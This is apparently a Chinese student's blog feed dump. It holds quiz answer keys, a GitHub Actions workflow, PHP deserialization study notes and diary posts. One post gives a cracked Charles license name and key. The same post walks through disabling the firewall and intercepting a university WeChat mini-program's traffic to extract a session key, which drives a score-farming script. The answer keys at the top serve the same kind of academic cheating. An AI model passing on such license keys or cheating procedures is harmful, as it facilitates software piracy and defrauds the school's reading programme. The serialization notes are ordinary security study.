title="第3章"></a>第3章</h4><p>1-5:CBCCC<br>6:ABC<br>7:ABCE<br>8:ABCD<br>9:BCD<br>10:ACD<br>11:AD<br>12:AC<br>13:AB<br>14:BCD<br>15:ABCD<br>16-20:AABBA<br>21-25:BBAAA</p><h4 id="第4章"><a href="#第4章" class="headerlink" title="第4章"></a>第4章</h4><p>1-5:DAADC<br>6-10:AABAC<br>11:ABCDE<br>12:ABDE<br>13:ABCE<br>14:CD<br>15:AB<br>16-17:ABCD<br>18:DE<br>19:ABC<br>20:BC<br>21-25:ABBBA<br>26-30:AAABA</p><h4 id="第5章"><a href="#第5章" class="headerlink" title="第5章"></a>第5章</h4><p>1-5:CCABC<br>6:ABC<br>7:ABCDE<br>8:BCCD<br>9:AB<br>10:ABCD<br>11-12:ABCDE<br>13:ABC<br>14:BC<br>15:ABC<br>16-20:BBABA<br>21-25:BAABA</p><h4 id="第6章"><a href="#第6章" class="headerlink" title="第6章"></a>第6章</h4><p>1-5:CCCDC<br>6-8:ABCDE<br>9:ABC<br>10:ABCD<br>11:BCD<br>12:ABCD<br>13:AD<br>14:AB<br>15:ABC<br>16-20:AABAB<br>21-25:BAAAA</p><h4 id="第7章"><a href="#第7章" class="headerlink" title="第7章"></a>第7章</h4><p>1-5:BCDBB<br>6-10:DBBBD<br>11:ABCD<br>12:ABC<br>13:ACD<br>14:ABCDE<br>15:ABCD<br>16:ABC<br>17:CD<br>18:CD<br>19:CDE<br>20:ABD<br>21-25:AABBA<br>26-30:AAAAAA</p><h4 id="第8章"><a href="#第8章" class="headerlink" title="第8章"></a>第8章</h4><p>1-5:DCBBC<br>6-10:CCDAD<br>11:ABD<br>12:CDE<br>13:AB<br>14:ABCDE<br>15:ABCD<br>16:BCD<br>17:ABCDE<br>18:ABCD<br>19:ABD<br>20:AC<br>21-25:AAAAA<br>26-30:AAABA</p><h4 id="第9章"><a href="#第9章" class="headerlink" title="第9章"></a>第9章</h4><p>1-5:DBBDA<br>6-10:CBDDC<br>11:ABCDE<br>12-13:ABCD<br>14-16:ABCDE<br>17:ABC<br>18:ABCD<br>19:ABC<br>20-25:BBAAA<br>26-30:BABAA</p><h4 id="第10章"><a href="#第10章" class="headerlink" title="第10章"></a>第10章</h4><p>1-5:ACDCB<br>6-10:DDBBB<br>11:ABCDE<br>12:ABCD<br>13-14:ABCDE<br>15-16:ABCD<br>17:ABC<br>18:ABCD<br>19:ABC<br>20:BC<br>21-25:BBAAA<br>26-30:ABABA</p><h4 id="第11章（？）"><a href="#第11章（？）" class="headerlink" title="第11章（？）"></a>第11章（？）</h4><p>1-5:CCBAA<br>6-10:ACABC<br>11:ABC<br>12:ABCCD<br>13:ABCE<br>14:CDE<br>15-17:ABCD<br>18-19:ABCDE<br>20:ACE<br>21-25:AABAA<br>26-30:AAAAB</p><h3 id="不保证完全一致，极可能存在多套题组，请核对后再查看-1"><a href="#不保证完全一致，极可能存在多套题组，请核对后再查看-1" class="headerlink" title="不保证完全一致，极可能存在多套题组，请核对后再查看"></a>不保证完全一致，极可能存在多套题组，请核对后再查看</h3>]]></content>
      
      
      <categories>
          
          <category> 闲聊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 闲聊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github Action初体验</title>
      <link href="/2023/02/02/20230202/"/>
      <url>/2023/02/02/20230202/</url>
      
        <content type="html"><![CDATA[<h3 id="Github-Action"><a href="#Github-Action" class="headerlink" title="Github Action"></a>Github Action</h3><p>今天小小地了解了一下Github Action这个东西<br>感觉它实际上就是一个轻量级服务器而已<br>用户每个月有限制内存和运行时间，但是基本上不用担心用完</p><p>Action可以选择很多模板，也可以自己设置定时任务。<br>文件是yaml类型，语法不难理解<br>尝试几次就成功把以前那个该死的经典诵读文件做成一个定时任务了。</p><p>感觉很好的是密钥的添加很方便，也很好管理<br>但是，还是要翻旧账批评它没有一键删除history这个功能</p><p>这个定时任务文件代码放在这里了，有需要的自己改了用吧</p><pre><code># This workflow will install Python dependencies, run tests and lint with a single version of Python# For more information see: https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-pythonname: Python applicationon:  schedule:  # 定时任务，在每天的上午11点推送天气信息到邮箱    - cron: &#39;0 3 * * *&#39;    jobs:  build:    runs-on: ubuntu-latest    steps:    - uses: actions/checkout@v3    - name: Set up Python 3.10      uses: actions/setup-python@v3      with:        python-version: &quot;3.10&quot;            - name: Install dependencies      run: |        python -m pip install --upgrade pip        pip install flake8 pytest        pip3 install requests        if [ -f requirements.txt ]; then pip install -r requirements.txt; fi            - name: RunScripts      run: |        # stop the build if there are Python syntax errors or undefined names        python 程序.py        # exit-zero treats all errors as warnings. The GitHub editor is 127 chars wide</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NoneBot2框架&amp;刷机小记</title>
      <link href="/2023/02/01/202301%E6%9C%88%E6%80%BB%E7%BB%93/"/>
      <url>/2023/02/01/202301%E6%9C%88%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>半个月前，我一时兴起入坑QQbot，在go-cqhttp和nonebot2上接触到异步代码。<br>以及，在Python的异步代码里使用requests会堵塞这个问题。<br>自己写了点插件，也爬了很多api端口和网站。<br>本来想着在官网上也发布一个插件的，但是想想自己的臃肿的代码还是算了。<br><img src="https://s2.loli.net/2023/02/02/V57JDlnIgtaz2iq.png" alt="Bot长这样"><br><img src="https://s2.loli.net/2023/02/02/x8DAz94RnSQHZVJ.png" alt="查看服务器状态的插件"><br>近几天在玩刷机，拿个高通410的随身wifi刷了Debian。<br>超频到2.1GHz，同时释放了内存，现在它有这么大！<br><img src="https://s2.loli.net/2023/02/02/JeSaDVBqiMIc5yZ.png" alt="就问你离不离谱！"><br>你敢相信？他能跑上面所说的nonebot2<br>甚至能流畅运行1.8.8及更高版本的mc服务器！<br>今天下午试着用ZeroTier内网穿透，但是很可惜没做完。</p><p>由于17号要开学了，所以接下来还是多看看课本吧。<br>毕竟开学之后每周一从早八到晚上九点真的要命！！！</p>]]></content>
      
      
      <categories>
          
          <category> 闲聊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 闲聊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新年快乐！</title>
      <link href="/2023/01/21/%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90%EF%BC%81/"/>
      <url>/2023/01/21/%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2023/01/20/1R8PjGN5Baq7dJW.jpg" alt="随便写点东西"><br><img src="https://s2.loli.net/2023/01/20/PJjSVf2ZcrsplF6.png" alt="随便放点喜欢的图"><br><img src="https://s2.loli.net/2023/01/20/5QgoSpuZj8tzY4H.jpg" alt="过年就要做喜欢的事"><br><img src="https://s2.loli.net/2023/01/20/ASsKZNOHUvQ1oh3.jpg" alt="开心就好呐"><br><img src="https://s2.loli.net/2023/01/20/cUhNVqupKTbSa57.png" alt="过去没达到的目标"><br><img src="https://s2.loli.net/2023/01/20/QPysl5H9gJKNMY3.png" alt="就让它留在过去吧"><br><img src="https://s2.loli.net/2023/01/20/T5jayCcslFYtbG7.jpg" alt="但是现在立下的目标"><br><img src="https://s2.loli.net/2023/01/20/sDyIUJd1zkepg5H.jpg" alt="一定要为它负责啊！"></p><h6 id="小事记"><a href="#小事记" class="headerlink" title="小事记"></a>小事记</h6><p>本来打算在春节之前写完一个CVE的漏洞复现，但是写了一半才发现已经被师兄抢了！！！<br>师兄你不讲武德，抢了所有任务里最简单的一个哈哈哈。<br>没办法只能写另外一个CVE了，但是由于不是很懂java和c，所以理解很困难。<br>看了一堆大佬的文章之后终于搞明白了，也磕磕绊绊地大概写了一个exp<br>最后看到只能自己搭建漏洞环境来测试，这下就真的顶不住了……<br>现在我不打算继续搭建了，毕竟这样子做出来的成本太高，效果很差不说，跟我现在接触的知识还有些脱节。</p><h6 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h6><p>世界有长久事物，便是安慰。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有点意思~</title>
      <link href="/2023/01/12/20230112/"/>
      <url>/2023/01/12/20230112/</url>
      
        <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2023/01/12/HxhJLnMmr7TvGIX.png" alt="真正值得纪念的，或许不止是一张画片"><br><img src="https://s2.loli.net/2023/01/13/1vqJb5eflmtMFIp.png" alt="你见证了她的努力，此时就再守护她一会吧"><br><img src="https://s2.loli.net/2023/01/13/sCdprRjVKS1Gz3X.png" alt="想找出“恋爱”的公式，或许还需要一段时间"><br><img src="https://s2.loli.net/2023/01/13/SHhNsIKOYijGLuz.png" alt="玫瑰的意义，只存在于你我心中"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>经典诵读的正确打开方式</title>
      <link href="/2023/01/07/20220107/"/>
      <url>/2023/01/07/20220107/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><p>今天是广州某大学的wx小程序研究资料。<br>既然来了，那么话不多说，直接上教程<br>首先下载安装必备的应用<br><em>关于Python的安装和环境配置就不在这里赘述了</em><br><strong><a href="https://blog.csdn.net/qq_45502336/article/details/109531599?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167291320016800186585384%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=167291320016800186585384&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-9-109531599-null-null.142%5Ev70%5Econtrol,201%5Ev4%5Eadd_ask&utm_term=python&spm=1018.2226.3001.4187">Python传送门</a></strong><br><strong>Charles</strong><br>1.前往<a href="https://www.charlesproxy.com/download/">官网</a>下载安装最新版本<br><img src="https://s2.loli.net/2023/01/07/m1S8RCupIAgQyP9.png" alt="随便选个喜欢的"><br>2.在下图处输入<strong>pojie</strong>和<strong>9d8fb452d26c0decc5</strong>后确定<br><img src="https://s2.loli.net/2023/01/07/ZzpSn2uRG8BgIoA.png" alt="恭喜你解锁VIP"><br>3.点击HEIP-&gt;SSLProxying-&gt;Install Charles Root Certificate配置证书<br>4.点击【安装】，点击【下一步】，然后选【放入下列存储】，然后是【受信任的根证书颁发机构】<br>5.点击【Proxy】–&gt;【SSL Proxying Settings…】<br>6.勾选【Enable SSL Proxying】点击【add】，在Host输入【*】，在Prot输入【443】最后点击【ok】保存</p><h5 id="接下来是抓包"><a href="#接下来是抓包" class="headerlink" title="接下来是抓包"></a>接下来是抓包</h5><p>1.关闭防火墙:打开网络设置&gt;高级网络设置&gt;Windows防火墙&gt;公用网络&gt;关闭并确认<br>2.在PC端wx中打开该小程序<br>3.在任务管理器里找到该小程序的应用<br><img src="https://s2.loli.net/2023/01/07/meVHGjo6vDNUScL.png" alt="找到这个万恶之源！"><br>4.右键点开小程序，打开文件所在位置，找到一个叫Runtime的包<br>5.将小程序和微信都关闭掉（否则部分文件删除不掉），然后将Runtime包下的文件都删除掉<br>6.把Runtime文件夹改为只读状态<br><img src="https://s2.loli.net/2023/01/07/YtoPvDxO6Z8unwa.png" alt="就是这个"><br>7.重新进入该wx小程序登录<br>8.打开Charles后在小程序内随意进入一个页面<br>9.CTRL+F输入<strong>key</strong>找到并复制字段<br><img src="https://s2.loli.net/2023/01/07/ruwzPXvIG7AWCNB.png" alt="就类似于这样，不能放得更多了"></p><h5 id="最后开始让代码跑起来"><a href="#最后开始让代码跑起来" class="headerlink" title="最后开始让代码跑起来"></a>最后开始让代码跑起来</h5><p>在主程序的这个位置粘贴刚刚复制的key并运行<br><img src="https://s2.loli.net/2023/01/07/tSf9DFdlPKWLBbs.png" alt="报错没有库的自己装"></p><h4 id="这就结束了？当然不！"><a href="#这就结束了？当然不！" class="headerlink" title="这就结束了？当然不！"></a>这就结束了？当然不！</h4><h5 id="接下来是移动端部分"><a href="#接下来是移动端部分" class="headerlink" title="接下来是移动端部分"></a>接下来是移动端部分</h5><p>1.打开<a href="https://pan.baidu.com/s/1ff-HmcwQSz8cHGqgpMJrcw">百度网盘</a>链接下载安装pydriod，提取码:de5q<br>2.打开保存在手机里的主程序文件并填入key<br>3.左栏Pip中选择INSTALL，分别输入requests,json,random,urllib,time并INSTALL<br>4.左栏Settings的Editor选项内打开Preserve files on exit<br>5.点击大大的黄色的运行按钮</p><p>注:<br>如果运行时发生错误请检查网络或尝试重启<br>如果出现名字不显示或者各种奇奇怪怪的bug但确确实实在运行，那么看着就好(正所谓能跑就行)<br>如果显示<strong>得分失败，重新开始匹配</strong>就多等一会，因为没有真人跟你匹配是不会得分的<br>本章内容只对该小程序进行分析，仅限学习研究使用，严禁进行其他非法行为！造成的后果本人不承担相关责任。<br>严禁任何人以任何形式传播此文章相关内容，否则本人不承担任何责任。</p><p><em><strong>最后感谢该校各位前辈的指导和帮助！！！</strong></em></p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p><strong>每个烟花都像是盲盒，不知道点燃升空之后会是什么颜色、什么形状、会持续多久。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Midjourney</title>
      <link href="/2023/01/06/20220106/"/>
      <url>/2023/01/06/20220106/</url>
      
        <content type="html"><![CDATA[<h5 id="无聊玩了一下Midjourney，挺方便，功能也很强大"><a href="#无聊玩了一下Midjourney，挺方便，功能也很强大" class="headerlink" title="无聊玩了一下Midjourney，挺方便，功能也很强大"></a>无聊玩了一下Midjourney，挺方便，功能也很强大</h5><p><img src="https://s2.loli.net/2023/01/06/vBlOqfjzJATF2kG.png#pic_center" alt="荒星"><br><img src="https://s2.loli.net/2023/01/07/uTWD6a93ZHOlxLq.png#pic_center" alt="好像刀妹"><br><img src="https://s2.loli.net/2023/01/06/X1FeICpcr74lkL9.png#pic_center" alt="粉毛YYDS"></p><h5 id="最后放个邀请地址"><a href="#最后放个邀请地址" class="headerlink" title="最后放个邀请地址"></a>最后放个<a href="https://discord.com/invite/midjourney">邀请地址</a></h5>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hentai</title>
      <link href="/2023/01/05/20220105/"/>
      <url>/2023/01/05/20220105/</url>
      
        <content type="html"><![CDATA[<h5 id="能找到这里的都是Hentai"><a href="#能找到这里的都是Hentai" class="headerlink" title="能找到这里的都是Hentai"></a>能找到这里的都是<a href="https://track.mp3-malina.me/play-track/d33532303034b6303534368cb734823000/ff34543f34e2aa427c7b17347be4cc40/S3rl%20-%20Hentai.mp3">Hentai</a></h5>]]></content>
      
      
      <categories>
          
          <category> 资源 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 资源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图床及其相关</title>
      <link href="/2023/01/04/20220104/"/>
      <url>/2023/01/04/20220104/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h5 id="图床的创建"><a href="#图床的创建" class="headerlink" title="图床的创建"></a>图床的创建</h5><p>市面上免费的图床有SM.MS&emsp;Sibnet&emsp; Shutterfly<br>不完全免费的也有腾讯云&emsp; 阿里云&emsp; 七牛云<br>这里我把阿里云和SM.MS都试了一下</p><p>创建的话就跟着下面的步骤走就行了:<br>一.阿里云<br>&emsp;1.打开<a href="https://www.aliyun.com/?spm=5176.8466032.top-nav.dlogo.27b81450NiIk8F">官网</a>点击右上角进行注册/登录<br>&emsp;2.实名认证<br>&emsp;3.在左上角折叠页面里选择对象存储OSS<br>&emsp;4.右侧Bucket管理板块点击添加Bucket<br>&emsp;5.名称填写Bucket的名字，读写权限更改为公共读，其他的默认即可<br>&emsp;6.创建完成之后鼠标移至右上角头像上，选择AccessKey管理<br>&emsp;7.查看Secret并分别复制两行ID<br>&emsp;8.前往<a href="https://github.com/Molunerfinn/PicGo/releases">PicGo下载页面</a>选择对应版本下载安装<br>&emsp;9.打开PicGo图床设置的阿里云页面填写相关资料<br>&emsp;10.上传区选择格式就能使用了<br>二.SM.MS<br>&emsp;1.<a href="https://smms.app/">官网注册/登录</a><br>&emsp;2.复制<a href="https://smms.app/home/apitoken">此页面</a>的Secret Token<br>&emsp;3.在<a href="https://smms.app/">此页面</a>上传文件<br>&emsp;4.打开PicGo的SM.MS页面粘贴Secret Token<br>&emsp;5.上传区选择格式就能使用了</p><p>注:<br>1.我在使用PicGo链接SM.MS时总是失败，不知道为啥<br>2.因为阿里云不是免费的，想省钱可以选择香港<br>3.一定要设置<a href="https://help.aliyun.com/document_detail/31869.html?spm=5176.8466032.bucket.28.27b81450rEXDcJ">防盗链</a></p><h5 id="图床在markdown中的使用"><a href="#图床在markdown中的使用" class="headerlink" title="图床在markdown中的使用"></a>图床在markdown中的使用</h5><p>方法一:使用img标签</p><pre><code> &lt;img src=&quot;图片地址&quot;&gt;</code></pre><p>方法二:md语法</p><pre><code> ![图片简介](图片地址)</code></pre><h5 id="更改图片参数"><a href="#更改图片参数" class="headerlink" title="更改图片参数"></a>更改图片参数</h5><pre><code>使用html更改位置&lt;center&gt;&lt;img src=&quot;地址&quot;&gt;&lt;/center&gt;居中对齐操作：#pic_center向左对齐操作：#pic_left向右对齐操作：#pic_right想调整图片的尺寸就在上面这个指令后面加上=200x200(=200x宽高自适应)width=&quot;100&quot;调整大小</code></pre><p>今天的内容就这么多，下次有空再继续写。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p><strong>眼下的生活，不是没有快乐。只是所有快乐都暗含着一层谨慎的底色。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年度总结</title>
      <link href="/2022/12/31/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
      <url>/2022/12/31/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h4 id="呆"><a href="#呆" class="headerlink" title="呆~"></a>呆~</h4><p>  简直突如其来呐。<br>  万万没想到一个月就过去了，时间过得真快啊。</p><p>  在2022年的抗疫决赛圈，几乎所有人都成了小阳人，其中也包括我。<br>  发烧第一天真的是给我吓到了，中午一觉起来高烧42.5℃，惊恐之余赶紧撑着摇摇欲坠的身体去买布洛芬(似乎我这个城市退烧药还算充足？)到晚上睡前才降到39℃。看到那个长度我真的是笑希了，感觉39℃也不过是小问题……<br>  (⁄ ⁄•⁄ω⁄•⁄ ⁄)<br>  感谢芙灵和一个现在被迫带烧返校的可怜的江苏高三Dog!<br>  现在病情已经到了欲说还休的阶段了，因此被鹅鸭杀劝退<del>，因此才能闲到来写这个文章</del><br>  希望早日康复吧，我还想吃正新鸡排</p><p>  这个小小站点活过了第一个国庆，第一个圣诞，马上就是元旦和春节了，希望这里能永远保存下去。<br>  最近了解了GitHub Arctic Code Vault这个东东，虽然说想得到这个可能有点不现实，但是可以把它当作理想吧。<br>  (づ ●─● )づ</p><p>  对于2023年的规划没有太多的变化，仍然是多学习，多看世界，多保重身体。<br>  人生刚刚开始，未来可期。<br>  犹豫不决的时候不要问别人，问自己。听别人的如果后悔了，是要后悔两次的。</p><p>  最后，元旦快乐~</p><p>  乾杯 []~ （￣▽￣） ~*</p><h5 id="20230104补档"><a href="#20230104补档" class="headerlink" title="20230104补档"></a>20230104补档</h5><p>  <strong>试验阿里云+PicGo图床</strong><br>   <img src="https://liuguobin-blog.oss-cn-hongkong.aliyuncs.com/base.png#pic_center" width="300"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP序列化及常见魔术方法</title>
      <link href="/2022/12/04/20221204/"/>
      <url>/2022/12/04/20221204/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><pre><code>【数组序列化】&lt;?php$a=null;echo serialize($a);?&gt;a:参数数量:&#123;i:0;s:字符串长度:&quot;字符串&quot;;&#125;$a=null;         N;$b=123456;       i:123456;$c=1.2;          d:1.2;$d=true;         b:1;$e=false;        b:0;$f=&#39;benben&#39;;     s:长度:字符串;【对象序列化】&lt;?phpclass lei&#123;    public $chengyuan=&#39;zifuchuan&#39;;    function hanshu()&#123;        echo $this-&gt;chengyuan;    &#125;&#125;$a=new lei();echo serialize($a);echo urlencode(serialize($a));?&gt;O:类名长度:&quot;类名&quot;:1:&#123;s:成员长度:&quot;成员名&quot;;s:值长度:&quot;值&quot;;&#125;修饰符public公有，private私有私有的成员属性要在前后都加上二进制的%00,在urlencode时可以看见【对象序列化的嵌套】&lt;?phpclass test&#123;    public $pub=&#39;benben&#39;;    function jineng()&#123;        echo $this-&gt;pub;    &#125;&#125;class test2&#123;    var $ben;&#125;$b=new test();$a=new test2();$a-&gt;ben=$b;echo serialize($a);?&gt;O:5:&quot;test2&quot;:1:&#123;s:3:&quot;ben&quot;;O:4:&quot;test&quot;:1:&#123;s:3:&quot;pub&quot;;s:6:&quot;benben&quot;;&#125;&#125;当在对象内调用对象时，会出现嵌套:实例化后的对象$a的成员变量&#39;ben&#39;调用实例化后的对象$b</code></pre><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>1.反序列化后的内容为一个对象，与序列化相反<br>2.反序列化生成的对象内的值，由反序列化里的值提供，与原有类预定义的值无关<br>3.反序列化不触发类的成员方法，需要调用方法之后才能触发</p><pre><code>&lt;?phpclass test&#123;    public $a=&#39;benben&#39;;    protected $b=666;    private $c=false;    public function displayVar()&#123;        echo $this-&gt;a;    &#125;&#125;$d=new test();$d=serialize($d);echo urlencode($d);$a=urlencode($d);$b=unserialize(urldecode($a));$b-&gt;displayVar();var_dump($b);?&gt;benbenobject(test)#1 (3) &#123;  [&quot;a&quot;]=&gt;  string(6) &quot;benben&quot;  [&quot;b&quot;:protected]=&gt;  int(666)  [&quot;c&quot;:&quot;test&quot;:private]=&gt;  bool(false)&#125;</code></pre><h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h4><p>概念:<br>预定好的，在特定的情况下处罚的行为方法。<br>反序列化成因(作用):<br>反序列化过程中unserizlize()接收的值(字符串)可控；<br>通过更改这个值(字符串)，所得到的代码；<br>通过调用方法，触发代码执行。<br>相关机制:<br>触发时机(先决条件)-&gt;功能(最重要)-&gt;参数(尤其是pop链)-&gt;返回值<br>详解:</p><pre><code>1.__construct()构造函数在实例化对象时，自动执行的方法只有当new时触发，不需要特地调用2.__destruct()析构函数在对象的所有引用都被删除或者对象被显式销毁时才触发new和unserialize之后会触发3.__sleep()清理对象可以传入成员属性，serialize之前触发并返回一个包含对象中所有需要被序列化的变量名称的数组如果无返回则NULL被序列化，产生E_NOTICE错误4.__wakeup()预先准备对象资源，返回void在unserialize前触发5.__tostring()表达方式错误把对象当成字符串调用时触发，如echo，print6.__invoke()格式表达错误把对象当成函数调用时触发，如echo $a() -&gt; hanshu7.__call()不存在方法不存在调用的方法时触发8.__callStatic()不存在方法静态调用或调用成员常量不存在时使用9.__get()不存在方法检查成员属性是否存在10.__set()不存在方法给不存在的成员属性赋值时触发11.__isset()或__empty()或__unset()不可访问对不可访问的属性访问时会触发如protect属性(不可读)或根本不存在的属性12.__clone()复制使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法__clone()</code></pre><p>注意:<br>1.只有该类或对象包含了该魔术方法才能被使用或触发<br>2.先分析尾部代码看看有什么执行的步骤<br>3.接着从触发的方法及其顺序判断漏洞的利用地点<br>4.最后构造playload<br>5.比较长的代码建议使用反推法进行分析<br>6.一定要先实例化(new)</p><h4 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h4><p>反序列化中成员变量可以被控制，使用有一种漏洞叫面向属性编程(POP)<br>POP链是利用魔术方法在里面多次跳转然后获取敏感信息的一种playload</p><h4 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h4><p>概念验证(POC)是漏洞验证程序，只是为了证明提出者观点的一段代码</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221202</title>
      <link href="/2022/12/02/20221202/"/>
      <url>/2022/12/02/20221202/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h4>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>20221202</title>
      <link href="/2022/12/02/20221202/"/>
      <url>/2022/12/02/20221202/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>小声比比</title>
      <link href="/2022/12/01/20221201%E6%9C%88%E7%BB%93/"/>
      <url>/2022/12/01/20221201%E6%9C%88%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h5 id="又是一个月，该总结一下了"><a href="#又是一个月，该总结一下了" class="headerlink" title="又是一个月，该总结一下了"></a>又是一个月，该总结一下了</h5><p>  首先还是这个月干了啥。<br>  好像也没干啥？？？<br>  学了JS，PHP，数据库，一点点命令，还有算是课内知识的python爬虫<br>  虽然看着学了很多，但是基础并不牢固。<br>  因此<br>  我可能将要用至少一个月的时间来消化从建站到现在所学的内容<br>  毕竟…<br>  高数和现代终究是大头，还有一个计导虎视眈眈</p><p>  接着来说说接下来一个月的计划吧~<br>  首先，既然是在家上网课<br>  当然是要<br>  <del>吃了就睡，睡了就吃，跟个死猪一样</del><br>  <em><strong>好好学习，天天向上</strong></em></p><h5 id="鸭梨山大"><a href="#鸭梨山大" class="headerlink" title="鸭梨山大"></a>鸭梨山大</h5><p>  其实在这个月的学习中我的感触很深，网络安全绝不是一朝一夕可以完成的(屁话)<br>  现在所学的全部这些内容可以说都是前置知识的一部分<br>  包括在平时练习的CTF，都是走向安全的一段路<br>  那么，既然如此<br>  我更应该将重心放在基础上，而非一味的追求解题量<br>  甚至是成为众人最不屑的“赛棍”。</p><h5 id="还有啥好讲的？"><a href="#还有啥好讲的？" class="headerlink" title="还有啥好讲的？"></a>还有啥好讲的？</h5><p>  既然这是一篇发布在博客的文章，那就再聊聊博客的事吧<br>  首先是最令我头疼的事——主页解析的视频老是失效。真的是脑阔疼，我找了很久了，但是一直没有解决方法，如果有人有方法或是突发奇想请在GitHub上评论，十分感谢！！！<br>  然后是关于加载速度有些缓慢甚至是在网不好的情况下出现白屏的问题(响应速度还是蛮快的，并没有发生许多人所说的被墙的情况，尽管是在校园网的情况下)，是因为主页启用了过多插件的缘故，在一段时间后(可能年后有空时)，会对这个blog进行一次大修改，争取加载时间缩短到1000毫秒内吧。<br>  最后，还是重复说明一下。这个博客虽然是public的，但是我只希望它的作用只是个刻录我在大学四年或更久的时光里的里程碑。时不时记录下成长经历，时不时写点随笔，时不时慷慨地发点自己总结的知识梳理，方便我自己和其他来到这里的 <em><strong>朋友们</strong></em> 学习。</p><h5 id="好了，最后还是一句"><a href="#好了，最后还是一句" class="headerlink" title="好了，最后还是一句"></a>好了，最后还是一句</h5><p><strong>人，活的不是一个点，人活起伏。</strong><br>说人话版:是个三维的东西就不要天天像个二维的玩意一样躺平~</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali常用命令</title>
      <link href="/2022/11/21/Kali%E5%91%BD%E4%BB%A4/"/>
      <url>/2022/11/21/Kali%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="kali的常用命令"><a href="#kali的常用命令" class="headerlink" title="kali的常用命令"></a>kali的常用命令</h1><h3 id="1-基础命令"><a href="#1-基础命令" class="headerlink" title="1.基础命令"></a>1.基础命令</h3><pre><code>passwd 修改密码passwd root 修改root用户密码date 显示系统日期sudo 后面加命令 就可以调用管理权限apt-get update 更新软件列表访问源列表里的每个网址，并读取软件列表，然后保存在本地电脑。我们在新立得软件包管理器里看到的软件列表，都是通过update命令更新的。apt-get upgrade 更新软件把本地已安装的软件，与刚下载的软件列表里对应软件进行对比，如果发现已安装的软件版本太低，就会提示你更新。apt-get dist-upgrade 更新软件  --+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--【apt-get upgrade 与 apt-get dist-upgrade 